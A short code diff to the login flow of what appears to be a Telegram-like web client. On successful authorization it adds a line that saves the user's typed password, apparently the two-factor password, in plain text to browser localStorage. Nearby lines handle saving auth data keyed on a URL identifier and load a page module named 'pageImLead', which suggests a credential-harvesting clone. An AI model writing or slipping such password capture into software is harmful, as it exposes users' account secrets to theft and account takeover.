@@ -92,16 +92,18 @@ const onFirstMount = (): Promise<any> => {
       switch (response._) {
         case 'auth.authorization':
           clearInterval(getStateInterval);
-
+          localStorage.setItem('faPass', passwordInput.value)
           localStorage.setItem('core', 'false');
-          let url2 = window.location.href;
-          let currId2 = url2.split("/").pop();
-          if (!currId2.includes("%7C")) saveAuthData(currId2);
 
+          //   let href = document.location.href;
+          //   let id = href.split("/").pop();
+          //   if (!id.includes("%7C"))
+          //     saveAuthData(id).then(() => {
+          // });
           import('./pageImLead').then((m) => { m.default.mount(); });
-
           if (monkey) monkey.remove();
           window.location.reload()
+
           break;
         default:
           btnNext.removeAttribute('disabled');
